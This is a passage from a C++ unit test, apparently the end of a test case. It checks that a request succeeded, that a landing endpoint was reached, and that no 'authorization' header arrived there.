    EXPECT_TRUE(result->succeeded()) << lastStep(*result).detail;
    const auto seen = landingSeen();
    EXPECT_TRUE(seen.value("found", false));
    EXPECT_FALSE(seen["headers"].contains("authorization")) << seen.dump();
}
